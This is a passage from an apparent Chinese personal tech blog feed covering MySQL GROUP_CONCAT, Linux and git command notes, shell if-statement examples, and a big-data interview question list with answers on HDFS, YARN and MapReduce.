&#39;STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION&#39;;</span><br></pre></td></tr></table></figure><h1 id="十-合并函数"><a href="#十-合并函数" class="headerlink" title="十. 合并函数"></a>十. 合并函数</h1><h3 id="10-1-GROUP-CONCAT-根据分组合并"><a href="#10-1-GROUP-CONCAT-根据分组合并" class="headerlink" title="10.1 GROUP_CONCAT 根据分组合并"></a>10.1 GROUP_CONCAT 根据分组合并</h3><p><img src="/2020/10/10/%E6%95%B0%E6%8D%AE%E5%BA%93/2.png" alt="image-20201016171534556"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- SEPARATOR用于指定分隔符，默认为,逗号分隔</span><br><span class="line">select tid ,name, GROUP_CONCAT(teacher order by teacher asc SEPARATOR  &quot;:&quot;) from test3 group by tid ,name</span><br></pre></td></tr></table></figure><p><img src="/2020/10/10/%E6%95%B0%E6%8D%AE%E5%BA%93/3.png" alt="image-20201016171549675"></p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>&lt;font color=black size=8 face=&quot;宋体&quot;&gt;Linux&lt;/font&gt;</title>
      <link href="2020/09/29/Linux/"/>
      <url>2020/09/29/Linux/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h1 id="一-实用技巧"><a href="#一-实用技巧" class="headerlink" title="一.实用技巧"></a>一.实用技巧</h1><table><thead><tr><th>命令</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>：！</td><td>可以在vim模式下进行输入命令</td><td>：！ls  查看当前目录</td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><h1 id="二-系统命令"><a href="#二-系统命令" class="headerlink" title="二. 系统命令"></a>二. 系统命令</h1><table><thead><tr><th>命令</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>systemctl list-unit-files | grep enabled</td><td>查看开机自启动项目</td><td></td></tr><tr><td>scp -r -P 4588 <a href="mailto:root@192.168.19.11">root@192.168.19.11</a>:/usr/local/sin.sh /home/administrator</td><td></td><td>-P 制定传输的端口号 <br>-r 递归复制整个目录</td></tr><tr><td>==du -h –max-depth=1==</td><td>查看文件夹大小</td><td></td></tr><tr><td>==find dir/ -name “*sql” |wc -l==</td><td>统计某个文件夹下sql文件的个数</td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><h1 id="三-shell"><a href="#三-shell" class="headerlink" title="三. shell"></a>三. shell</h1><p>3.1 shell脚本</p><p>3.1.1 if 语句 （没有==）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 写法一：（）</span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">cmd=$1</span><br><span class="line">echo $cmd</span><br><span class="line">if (($cmd="start"))</span><br><span class="line">    then</span><br><span class="line">        echo "ok"</span><br><span class="line">    else</span><br><span class="line">            echo "no"</span><br><span class="line">    fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 写法二：[]</span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash    </span></span><br><span class="line">if [ $? == 0 ]</span><br><span class="line">then</span><br><span class="line">echo "the cluster is $cmd"</span><br><span class="line">else</span><br><span class="line">echo " error! "</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><h1 id="四-git"><a href="#四-git" class="headerlink" title="四. git"></a>四. git</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 在目的目录下：</span></span><br><span class="line">1、初始化</span><br><span class="line">    git init</span><br><span class="line"></span><br><span class="line">2. 自己要与origin master建立连接（下划线为远程仓库链接）</span><br><span class="line">  git remote add origin http://gitlab.alibaba-inc.com/vds-oneid/oneid_v2.git</span><br><span class="line"></span><br><span class="line">3. 把远程分支拉到本地</span><br><span class="line">  git fetch origin feature/liuxia.yxd/offline（远程仓库的分支名）</span><br><span class="line"></span><br><span class="line">4. 在本地创建分支dev并切换到该分支</span><br><span class="line">  git checkout -b offline(本地分支名称) origin/feature/liuxia.yxd/offline(远程分支名称)</span><br><span class="line">  </span><br><span class="line">5. 把某个分支上的内容都拉取到本地</span><br><span class="line">  git pull origin feature/liuxia.yxd/offline(远程分支名称)</span><br><span class="line">  </span><br><span class="line">6. 重置git账号密码(解决 fatal: unable to access)</span><br><span class="line">  git config --global --unset http.proxy </span><br><span class="line">  git config --global --unset https.proxy</span><br><span class="line">  </span><br><span class="line">  git update-git-for-windows</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>&lt;font color=black size=6 face=&quot;STCAIYUN&quot; style=&quot;font-weight:bold&quot;&gt;2020大数据面试题真题总结(附答案)&lt;/font&gt;</title>
      <link href="2020/08/28/2020%E5%A4%A7%E6%95%B0%E6%8D%AE%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9C%9F%E9%A2%98%E6%80%BB%E7%BB%93(%E9%99%84%E7%AD%94%E6%A1%88)/"/>
      <url>2020/08/28/2020%E5%A4%A7%E6%95%B0%E6%8D%AE%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9C%9F%E9%A2%98%E6%80%BB%E7%BB%93(%E9%99%84%E7%AD%94%E6%A1%88)/</url>
      
        <content type="html"><![CDATA[<p><a href="/download/1.xls">下载</a></p><table><thead><tr><th>版本</th><th>更新时间</th><th>更新内容</th></tr></thead><tbody><tr><td>v1.0</td><td>2020-07-01</td><td>新建</td></tr><tr><td>v1.1</td><td>2020-06-13</td><td>朋友面试大数据工程师提供的关于架构及数仓方面的题目</td></tr><tr><td>v1.2</td><td>2020-08-08</td><td>朋友面试数据专家提供的数据驱动，spark及flink方面面试题</td></tr><tr><td>v1.3</td><td>2020-08-22</td><td>朋友面试数据开发提供的关于hive及数仓方面的题目</td></tr></tbody></table><p>一.Hadoop</p><p>1.hdfs写流程</p><p>2.hdfs读流程</p><p>3.hdfs的体系结构</p><p>4.一个datanode 宕机,怎么一个流程恢复</p><p>5.hadoop 的 namenode 宕机,怎么解决</p><p>6.namenode对元数据的管理</p><p>7.元数据的checkpoint</p><p>8.yarn资源调度流程 </p><p>9.hadoop中combiner和partition的作用</p><p>10.用mapreduce怎么处理数据倾斜问题？</p><p>11.shuffle 阶段,你怎么理解的</p><p>12.Mapreduce 的 map 数量 和 reduce 数量是由什么决定的 ,怎么配置</p><p>13.MapReduce优化经验</p><p>14.分别举例什么情况要使用 combiner，什么情况不使用？</p><p>15.MR运行流程解析</p><p>16.简单描述一下HDFS的系统架构，怎么保证数据安全?</p><p>17.在通过客户端向hdfs中写数据的时候，如果某一台机器宕机了，会怎么处理</p><p>18.Hadoop优化有哪些方面</p><p>19.大量数据求topN(写出mapreduce的实现思路）</p><p>20.列出正常工作的hadoop集群中hadoop都分别启动哪些进程以及他们的作用</p><p>21.Hadoop总job和Tasks之间的区别是什么？</p><p>22.Hadoop高可用HA模式</p><p>23.简要描述安装配置一个hadoop集群的步骤</p><p>24.fsimage和edit的区别</p><p>25.yarn的三大调度策略</p><p>26.hadoop的shell命令用的多吗?,说出一些常用的</p><p>二.Hive</p><p>1.大表join小表产生的问题，怎么解决？</p><p>2.udf udaf udtf区别</p><p>3.hive有哪些保存元数据的方式，个有什么特点。</p><p>4.hive内部表和外部表的区别</p><p>5.生产环境中为什么建议使用外部表？</p><p>6.insert into 和 override write区别？</p><p>7.hive的判断函数有哪些</p><p>8.简单描述一下HIVE的功能？用hive创建表几种方式？hive表有几种？</p><p>9.线上业务每天产生的业务日志（压缩后&gt;=3G），每天需要加载到hive的log表中，将每天产生的业务日志在压缩之后load到hive的log表时，最好使用的压缩算法是哪个,并说明其原因</p><p>10.若在hive中建立分区仍不能优化查询效率，建表时如何优化</p><p>11.union all和union的区别</p><p>12.如何解决hive数据倾斜的问题</p><p>13.hive性能优化常用的方法</p><p>14.简述delete，drop，truncate的区别</p><p>15.四个by的区别</p><p>16.Hive 里边字段的分隔符用的什么？为什么用\t？有遇到过字段里 边有\t 的情况吗，怎么处理的？为什么不用 Hive 默认的分隔符，默认的分隔符是什么？</p><p>17.分区分桶的区别，为什么要分区</p><p>18.mapjoin的原理</p><p>19.在hive的row_number中distribute by 和 partition by的区别 </p><p>20.hive开发中遇到什么问题?</p><p>21.什么时候使用内部表,什么时候使用外部表</p><p>22.hive都有哪些函数，你平常工作中用到哪些</p><p>23.手写sql，连续活跃用户</p><p>24.left semi join和left join区别</p><p>25.group by为什么要排序</p><p>26.说说印象最深的一次优化场景，hive常见的优化思路</p><p>三.Spark</p><p>1.rdd的属性</p><p>2.算子分为哪几类(RDD支持哪几种类型的操作)</p><p>3.创建rdd的几种方式</p><p>4.spark运行流程</p><p>5.Spark中coalesce与repartition的区别</p><p>6.sortBy 和 sortByKey的区别</p><p>7.map和mapPartitions的区别</p><p>8.数据存入Redis  优先使用map mapPartitions  foreach  foreachPartions哪个</p><p>9.reduceByKey和groupBykey的区别</p><p>10.cache和checkPoint的比较</p><p>11.spark streaming流式统计单词数量代码</p><p>12.简述map和flatMap的区别和应用场景</p><p>13.计算曝光数和点击数</p><p>14.分别列出几个常用的transformation和action算子</p><p>15.按照需求使用spark编写以下程序，要求使用scala语言</p><p>16.spark应用程序的执行命令是什么？</p><p>17.Spark应用执行有哪些模式，其中哪几种是集群模式</p><p>18.请说明spark中广播变量的用途</p><p>19.以下代码会报错吗？如果会怎么解决 val arr = new ArrayList[String]; arr.foreach(println)</p><p>20.写出你用过的spark中的算子，其中哪些会产生shuffle过程</p><p>21.Spark中rdd与partition的区别</p><p>22.请写出创建Dateset的几种方式</p><p>23.描述一下RDD，DataFrame，DataSet的区别？</p><p>24.描述一下Spark中stage是如何划分的？描述一下shuffle的概念</p><p>25.Spark 在yarn上运行需要做哪些关键的配置工作？如何kill -个Spark在yarn运行中Application</p><p>26.通常来说，Spark与MapReduce相比，Spark运行效率更高。请说明效率更高来源于Spark内置的哪些机制？请列举常见spark的运行模式？</p><p>27.RDD中的数据在哪？</p><p>28.如果对RDD进行cache操作后，数据在哪里？</p><p>29.Spark中Partition的数量由什么决定</p><p>30.Scala里面的函数和方法有什么区别</p><p>31.SparkStreaming怎么进行监控?</p><p>32.Spark判断Shuffle的依据?</p><p>33.Scala有没有多继承？可以实现多继承么？</p><p>34.Sparkstreaming和flink做实时处理的区别</p><p>35.Sparkcontext的作用</p><p>36.Sparkstreaming读取kafka数据为什么选择直连方式</p><p>37.离线分析什么时候用sparkcore和sparksql</p><p>38.Sparkstreaming实时的数据不丢失的问题</p><p>39.简述宽依赖和窄依赖概念，groupByKey,reduceByKey,map,filter,union五种操作哪些会导致宽依赖，哪些会导致窄依赖</p><p>40.数据倾斜可能会导致哪些问题，如何监控和排查，在设计之初，要考虑哪些来避免</p><p>41.有一千万条短信，有重复，以文本文件的形式保存，一行一条数据，请用五分钟时间，找出重复出现最多的前10条</p><p>42.现有一文件，格式如下，请用spark统计每个单词出现的次数</p><p>43.共享变量和累加器</p><p> 44.当 Spark 涉及到数据库的操作时，如何减少 Spark 运行中的数据库连接数？</p><p>45.特别大的数据，怎么发送到excutor中？</p><p>46.spark调优都做过哪些方面？</p><p>47.spark任务为什么会被yarn kill掉？</p><p>48.Spark on Yarn作业执行流程？yarn-client和yarn-cluster有什么区别？</p><p>49.Flatmap底层编码实现？</p><p>​    50.spark_1.X与spark_2.X区别 </p><p>​    51.说说spark与flink</p><p>四.Kafka</p><p>1.Kafka名词解释和工作方式</p><p>2.Consumer与topic关系</p><p>3.kafka中生产数据的时候，如何保证写入的容错性？</p><p>4.如何保证kafka消费者消费数据是全局有序的</p><p>5.有两个数据源，一个记录的是广告投放给用户的日志，一个记录用户访问日志，另外还有一个固定的用户基础表记录用户基本信息（比如学历，年龄等等）。现在要分析广告投放对与哪类用户更有效，请采用熟悉的技术描述解决思路。另外如果两个数据源都是实时数据源（比如来自kafka），他们数据在时间上相差5分钟，需要哪些调整来解决实时分析问题？</p><p>6.Kafka和SparkStreaing如何集成?</p><p>7.列举Kafka的优点，简述Kafka为什么可以做到每秒数十万甚至上百万消息的高效分发？</p><p>8.为什么离线分析要用kafka？</p><p>9.Kafka怎么进行监控?</p><p>10.Kafka与传统的消息队列服务有很么不同</p><p>11.Kafka api  low-level与high-level有什么区别，使用low-level需要处理哪些细节</p><p>12.Kafka的ISR副本同步队列</p><p>13.Kafka消息数据积压，Kafka消费能力不足怎么处理？</p><p>14.Kafka中的ISR、AR又代表什么？</p><p>15.Kafka中的HW、LEO等分别代表什么？</p><p>16.哪些情景会造成消息漏消费？</p><p>17.当你使用kafka-topics.sh创建了一个topic之后，Kafka背后会执行什么逻辑？</p><p>18.topic的分区数可不可以增加？如果可以怎么增加？如果不可以，那又是为什么？</p><p>19.topic的分区数可不可以减少？如果可以怎么减少？如果不可以，那又是为什么？</p><p>20.Kafka有内部的topic吗？如果有是什么？有什么所用？</p><p>21.聊一聊Kafka Controller的作用？</p><p>22.失效副本是指什么？有那些应对措施？</p><p>五.Hbase</p><p>1.Hbase调优</p><p>2.hbase的rowkey怎么创建好？列族怎么创建比较好？</p><p>3.hbase过滤器实现用途</p><p>4.HBase宕机如何处理</p><p>5.hive跟hbase的区别是？</p><p>6.hbase写流程</p><p>7.hbase读流程</p><p>8.hbase数据flush过程</p><p>9.数据合并过程</p><p>10.Hmaster和Hgionserver职责</p><p>11.HBase列族和region的关系？</p><p>12.请简述Hbase的物理模型是什么</p><p>13.请问如果使用Hbase做即席查询，如何设计二级索引</p><p>14.如何避免读、写HBaes时访问热点问题？</p><p>15.布隆过滤器在HBASE中的应用</p><p>16.Hbase是用来干嘛的?什么样的数据会放到hbase</p><p>六.数仓</p><p>1.维表和宽表的考查（主要考察维表的使用及维度退化手法）</p><p>2.数仓表命名规范</p><p>3.拉链表的使用场景</p><p>4.一亿条数据查的很慢,怎么查快一点</p><p>5.有什么维表</p><p>6.数据源都有哪些</p><p>7.你们最大的表是什么表,数据量多少</p><p>8.数仓架构体系</p><p>9.数据平台是怎样的，用到了阿里的那一套吗？</p><p>10.你了解的调度系统有那些？，你们公司用的是哪种调度系统</p><p>11.你们公司数仓底层是怎么抽数据的？</p><p>12.为什么datax抽数据要比sqoop 快？</p><p>13.埋点数据你们是怎样接入的</p><p>14.如果你们业务库的表有更新，你们数仓怎么处理的？</p><p>15.能独立搭建数仓吗</p><p>16.搭建过CDH 集群吗</p><p>17.说一下你们公司的大数据平台架构？你有参与吗？</p><p>18.介绍一下你自己的项目和所用的技术</p><p>19.对目前的流和批处理的认识？就是谈谈自己的感受</p><p>20.你了解那些OLAP 引擎，MPP 知道一些吗？clickHouse 了解一些吗？你自己做过测试性能吗？</p><p>21.Kylin 有了解吗？介绍一下原理</p><p>22.datax 源码有改造过吗</p><p>23.你们数仓的APP 层是怎么对外提供服务的？</p><p>24.数据接入进来，你们是怎样规划的，有考虑数据的膨胀问题吗</p><p>25.简述拉链表，流水表以及快照表的含义和特点</p><p>26.全量表(df),增量表(di),追加表(da)，拉链表(dz)的区别及使用场景</p><p>27.你们公司的数仓分层，每一层是怎么处理数据的</p><p>28.什么是事实表，什么是维表</p><p>29.星型模型和雪花模型</p><p>30.缓慢变化维如何处理，几种方式</p><p>31.datax与sqoop的优缺点</p><p>32.datax抽数碰到emoji表情怎么解决</p><p>33.工作中碰到什么困难，怎么解决的</p><p>34.如何用数据给公司带来收益</p><p>35.需求驱动和业务驱动，数据开发和ETL开发，实战型和博客型</p><p>36.如何用数据实现业务增长，黑客增长？</p><p>37.什么是大数据？千万级别的数据完全可以用传统的关系型数据库集群解决，为什么要用到大数据平台。</p><p>38.数据质量，元数据管理，指标体系建设，数据驱动</p><p>39.什么是数仓,建设数仓时碰到过什么问题</p><p>40.实时数仓技术选型及保证exactly-once</p><p>41.维度建模和范式建模的区别；</p><p>42.埋点的码表如何设计；</p><p>43.集市层和公共层的区别；</p><p>44.缓慢变化维的处理方式</p><p>45.聊聊数据质量</p><p>46.说说你从0-1搭建数仓都做了什么？你觉得最有挑战的是什么？</p><p>七.Flink</p><p>1.Flink实时计算时落磁盘吗</p><p>2.日活DAU的统计需要注意什么</p><p>3.Flink调优</p><p>4.Flink的容错是怎么做的</p><p>5.Parquet格式的好处？什么时候读的快什么时候读的慢</p><p>6.flink中checkPoint为什么状态有保存在内存中这样的机制？为什么要开启checkPoint?</p><p>7.flink保证Exactly_Once的原理？</p><p>8.flink的时间形式和窗口形式有几种？有什么区别，你们用在什么场景下的？</p><p>9.flink的背压说下？</p><p>10.flink的watermark机制说下，以及怎么解决数据乱序的问题？</p><p>11.flink on yarn执行流程</p><p>12.说一说spark 和flink 的区别 </p><p>八.Java</p><p>1.hashMap底层源码，数据结构</p><p>2.写出你用过的设计模式，并举例说明解决的实际问题</p><p>3.Java创建线程的几种方式</p><p>4.请简述操作系统的线程和进程的区别</p><p>5.Java程序出现OutOfMemoryError:unable to create new native thread 的原因可能有哪些？如何分析和解决？</p><p>6.采用java或自己熟悉的任何语言分别实现简单版本的线性表和链表，只需实现add,remove方法即可</p><p>7.ArrayList和LinkedList的区别</p><p>8.JVM 内存分哪几个区，每个区的作用是什么?</p><p>9.Java中迭代器和集合的区别？</p><p>10.HashMap 和 HashTable 区别</p><p>11.线程池使用注意哪些方面？</p><p>12.HashMap和TreeMap的区别？TreeMap排序规则？</p><p>13.用java实现单例模式</p><p>14.使用递归算法求n的阶乘：n! ,语言不限</p><p>15.HashMap和Hashtable的区别是什么</p><p>16.TreeSet 和 HashSet 区别</p><p>17.Stringbuffer 和 Stringbuild 区别</p><p>18.Final、Finally、Finalize</p><p>19..==和 Equals 区别</p><p>20.比较ArrayList，LinkedList的存储特性和读写性能</p><p>21.Java 类加载过程</p><p>22.java中垃圾收集的方法有哪些?</p><p>23.如何判断一个对象是否存活?(或者GC对象的判定方法)</p><p>24.jvm、堆栈</p><p>九.Elasticsearch</p><p>1.为什么要用es？存进es的数据是什么格式的，怎么查询</p><p>十.Flume</p><p>1.什么是flume</p><p>2.flume运行机制</p><p>3.Flume采集数据到Kafka中丢数据怎么办</p><p>4.Flume怎么进行监控?</p><p>5.Flume的三层架构，collector、agent、storage</p><p>十一.Sqoop</p><p>1.Sqoop底层运行的任务是什么</p><p>2.sqoop的迁移数据的原理</p><p>3.Sqoop参数</p><p>4.Sqoop导入导出Null存储一致性问题</p><p>5.Sqoop数据导出一致性问题</p><p>十二.Redis</p><p>1.缓存穿透、缓存雪崩、缓存击穿</p><p>2.数据类型</p><p>3.持久化</p><p>4.悲观锁和乐观锁</p><p>5.redis 是单线程的，为什么那么快</p><p>6.redis的热键问题？怎么解决？</p><p>十三.Mysql</p><p>1.请写出mysql登录命令，用户名user，密码123456，地址192.168.1.130</p><p>2.为什么MySQL的索引要使用B+树而不是其它树形结构?比如B树？</p><p>十四.数据结构与算法</p><p>1.二分查找</p><p>2.快排</p><p>3.归并排序</p><p>4.冒泡排序</p><p>5.字符串反转</p><p>6.Btree简单讲一下</p><p>7.动态规划 最大连续子序列和</p><p>8.二叉树概念，特点及代码实现</p><p>9.链表</p><p>十五.Linux</p><hr><h1 id="一-Hadoop"><a href="#一-Hadoop" class="headerlink" title="一.Hadoop"></a>一.Hadoop</h1><h2 id="1-hdfs写流程"><a href="#1-hdfs写流程" class="headerlink" title="1.hdfs写流程"></a>1.hdfs写流程</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_png/dXCnejTRMLdfqmBAvcKIhLA5ZUrVlzNc3EZiaYzPHyVRGu7fGEU4r0ib8Seat0L2ZiaxF0v6GnU6uyJVd2KJKiauQA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><ol><li>客户端跟namenode通信请求上传文件，namenode检查目标文件是否已存在，父目录是否存在</li><li>namenode返回是否可以上传</li><li>client请求第一个 block该传输到哪些datanode服务器上</li><li>namenode返回3个datanode服务器ABC</li><li>client请求3台dn中的一台A上传数据（本质上是一个RPC调用，建立pipeline），A收到请求会继续调用B，然后B调用C，将真个pipeline建立完成，逐级返回客户端</li><li>client开始往A上传第一个block（先从磁盘读取数据放到一个本地内存缓存），以packet为单位，A收到一个packet就会传给B，B传给C；A每传一个packet会放入一个应答队列等待应答</li><li>当一个block传输完成之后，client再次请求namenode上传第二个block的服务器。</li></ol><h2 id="2-hdfs读流程"><a href="#2-hdfs读流程" class="headerlink" title="2.hdfs读流程"></a>2.hdfs读流程</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_png/dXCnejTRMLdfqmBAvcKIhLA5ZUrVlzNcWFVaYES9C2FSUGH2uKcIWZjhLpG1v23ayvicEsEzxja2WQlt1GHWRSQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><ol><li>client跟namenode通信查询元数据，找到文件块所在的datanode服务器</li><li>挑选一台datanode（就近原则，然后随机）服务器，请求建立socket流</li><li>datanode开始发送数据（从磁盘里面读取数据放入流，以packet为单位来做校验）</li><li>客户端以packet为单位接收，现在本地缓存，然后写入目标文件</li></ol><h2 id="3-hdfs的体系结构"><a href="#3-hdfs的体系结构" class="headerlink" title="3.hdfs的体系结构"></a>3.hdfs的体系结构</h2><p>hdfs有namenode、secondraynamenode、datanode组成。为n+1模式</p><ol><li>NameNode负责管理和记录整个文件系统的元数据</li><li>DataNode 负责管理用户的文件数据块，文件会按照固定的大小（blocksize）切成若干块后分布式存储在若干台datanode上，每一个文件块可以有多个副本，并存放在不同的datanode上，Datanode会定期向Namenode汇报自身所保存的文件block信息，而namenode则会负责保持文件的副本数量</li><li>HDFS的内部工作机制对客户端保持透明，客户端请求访问HDFS都是通过向namenode申请来进行</li><li>secondraynamenode负责合并日志</li></ol><h2 id="4-一个datanode-宕机-怎么一个流程恢复"><a href="#4-一个datanode-宕机-怎么一个流程恢复" class="headerlink" title="4.一个datanode 宕机,怎么一个流程恢复"></a>4.一个datanode 宕机,怎么一个流程恢复</h2><p>Datanode宕机了后，如果是短暂的宕机，可以实现写好脚本监控，将它启动起来。如果是长时间宕机了，那么datanode上的数据应该已经被备份到其他机器了，那这台datanode就是一台新的datanode了，删除他的所有数据文件和状态文件，重新启动。</p><h2 id="5-hadoop-的-namenode-宕机-怎么解决"><a href="#5-hadoop-的-namenode-宕机-怎么解决" class="headerlink" title="5.hadoop 的 namenode 宕机,怎么解决"></a>5.hadoop 的 namenode 宕机,怎么解决</h2><p>先分析宕机后的损失，宕机后直接导致client无法访问，内存中的元数据丢失，但是硬盘中的元数据应该还存在，如果只是节点挂了，重启即可，如果是机器挂了，重启机器后看节点是否能重启，不能重启就要找到原因修复了。但是最终的解决方案应该是在设计集群的初期就考虑到这个问题，做namenode的HA。</p><h2 id="6-namenode对元数据的管理"><a href="#6-namenode对元数据的管理" class="headerlink" title="6.namenode对元数据的管理"></a>6.namenode对元数据的管理</h2><p>namenode对数据的管理采用了三种存储形式：</p><ul><li>内存元数据(NameSystem)</li><li>磁盘元数据镜像文件(fsimage镜像)</li><li>数据操作日志文件（可通过日志运算出元数据）(edit日志文件)</li></ul><h2 id="7-元数据的checkpoint"><a href="#7-元数据的checkpoint" class="headerlink" title="7.元数据的checkpoint"></a>7.元数据的checkpoint</h2><p>每隔一段时间，会由secondary namenode将namenode上积累的所有edits和一个最新的fsimage下载到本地，并加载到内存进行merge（这个过程称为checkpoint）</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/dXCnejTRMLdfqmBAvcKIhLA5ZUrVlzNcaz7KRuFWknkD8wYfl8GpVmUVkqV8EWiccqia8snUaIJPodY19DTzGB0A/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><p>namenode和secondary namenode的工作目录存储结构完全相同，所以，当namenode故障退出需要重新恢复时，可以从secondary namenode的工作目录中将fsimage拷贝到namenode的工作目录，以恢复namenode的元数据</p><h2 id="8-yarn资源调度流程"><a href="#8-yarn资源调度流程" class="headerlink" title="8.yarn资源调度流程"></a>8.yarn资源调度流程</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_png/dXCnejTRMLdfqmBAvcKIhLA5ZUrVlzNcUQqLz8Zp3VqSsXKEQQszOY8WQVIX8qUIPCNP6E9ib1wCAia6vTgiaQiawQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><ol><li>用户向YARN 中提交应用程序， 其中包括ApplicationMaster 程序、启动ApplicationMaster 的命令、用户程序等。</li><li>ResourceManager 为该应用程序分配第一个Container， 并与对应的NodeManager 通信，要求它在这个Container 中启动应用程序的ApplicationMaster。</li><li>ApplicationMaster 首先向ResourceManager 注册， 这样用户可以直接通过ResourceManage 查看应用程序的运行状态，然后它将为各个任务申请资源，并监控它的运行状态，直到运行结束，即重复步骤4~7。</li><li>ApplicationMaster 采用轮询的方式通过RPC 协议向ResourceManager 申请和领取资源。</li><li>一旦ApplicationMaster 申请到资源后，便与对应的NodeManager 通信，要求它启动任务。</li><li>NodeManager 为任务设置好运行环境（包括环境变量、JAR 包、二进制程序等）后，将任务启动命令写到一个脚本中，并通过运行该脚本启动任务。</li><li>各个任务通过某个RPC 协议向ApplicationMaster 汇报自己的状态和进度，以让ApplicationMaster 随时掌握各个任务的运行状态，从而可以在任务失败时重新启动任务。在应用程序运行过程中，用户可随时通过RPC 向ApplicationMaster 查询应用程序的当前运行状态。</li><li>应用程序运行完成后，ApplicationMaster 向ResourceManager 注销并关闭自己。</li></ol><h2 id="9-hadoop中combiner和partition的作用"><a href="#9-hadoop中combiner和partition的作用" class="headerlink" title="9.hadoop中combiner和partition的作用"></a>9.hadoop中combiner和partition的作用</h2><ul><li>combiner是发生在map的最后一个阶段，父类就是Reducer，意义就是对每一个maptask的输出进行局部汇总，以减小网络传输量，缓解网络传输瓶颈，提高reducer的执行效率。</li><li>partition的主要作用将map阶段产生的所有kv对分配给不同的reducer task处理，可以将reduce阶段的处理负载进行分摊</li></ul><h2 id="10-用mapreduce怎么处理数据倾斜问题？"><a href="#10-用mapreduce怎么处理数据倾斜问题？" class="headerlink" title="10.用mapreduce怎么处理数据倾斜问题？"></a>10.用mapreduce怎么处理数据倾斜问题？</h2><p>数据倾斜：map /reduce程序执行时，reduce节点大部分执行完毕，但是有一个或者几个reduce节点运行很慢，导致整个程序的处理时间很长，这是因为某一个key的条数比其他key多很多（有时是百倍或者千倍之多），这条key所在的reduce节点所处理的数据量比其他节点就大很多，从而导致某几个节点迟迟运行不完，此称之为数据倾斜。</p><p>（1）局部聚合加全局聚合。</p><p>第一次在 map 阶段对那些导致了数据倾斜的 key 加上 1 到 n 的随机前缀，这样本来相</p><p>同的 key 也会被分到多个 Reducer 中进行局部聚合，数量就会大大降低。</p><p>第二次 mapreduce，去掉 key 的随机前缀，进行全局聚合。</p><p>思想：二次 mr，第一次将 key 随机散列到不同 reducer 进行处理达到负载均衡目的。第</p><p>二次再根据去掉 key 的随机前缀，按原 key 进行 reduce 处理。</p><p>这个方法进行两次 mapreduce，性能稍差。</p><p>（2）增加 Reducer，提升并行度</p><p>JobConf.setNumReduceTasks(int)</p><p>（3）实现自定义分区</p><p>根据数据分布情况，自定义散列函数，将 key 均匀分配到不同 Reducer</p><h2 id="11-shuffle-阶段-你怎么理解的"><a href="#11-shuffle-阶段-你怎么理解的" class="headerlink" title="11.shuffle 阶段,你怎么理解的"></a>11.shuffle 阶段,你怎么理解的</h2><p><img 